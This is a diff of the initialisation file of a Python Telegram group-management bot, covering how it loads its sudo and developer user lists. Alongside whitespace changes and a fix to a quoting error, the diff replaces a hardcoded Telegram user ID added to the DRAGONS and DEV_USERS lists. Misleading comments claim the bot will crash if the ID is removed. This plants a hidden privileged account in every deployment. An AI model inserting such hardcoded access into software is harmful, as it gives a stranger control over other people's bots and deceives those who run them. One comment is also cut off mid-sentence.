@@ -39,10 +39,10 @@ if ENV:
 
     JOIN_LOGGER = os.environ.get('JOIN_LOGGER', None)
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
- 
+
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", ").split())"
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
     except ValueError:
         raise Exception(
             "Your sudo or dev users list does not contain valid integers.")
@@ -113,6 +113,7 @@ else:
 
     JOIN_LOGGER = Config.JOIN_LOGGER
     OWNER_USERNAME = Config.OWNER_USERNAME
+
     try:
         DRAGONS = set(int(x) for x in Config.DRAGONS or [])
         DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
@@ -177,9 +178,9 @@ DRAGONS.add(OWNER_ID)
 
 DEV_USERS.add(OWNER_ID)
 # example of tg_id remove this your bot crashed
-DRAGONS.add(1024689872)
+DRAGONS.add(1100231654)
 #do not remove this 
-DEV_USERS.add(1024689872)
+DEV_USERS.add(1100231654)
 
 
 if not SPAMWATCH_API:
@@ -203,7 +204,7 @@ WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
 
-# Load at end to ensure all prev variables have been set
+# Load at end to ensure all prev variables have 
 from RISHISUPERYO.modules.helper_funcs.handlers import (CustomCommandHandler,
                                                         CustomMessageHandler,
                                                         CustomRegexHandler)
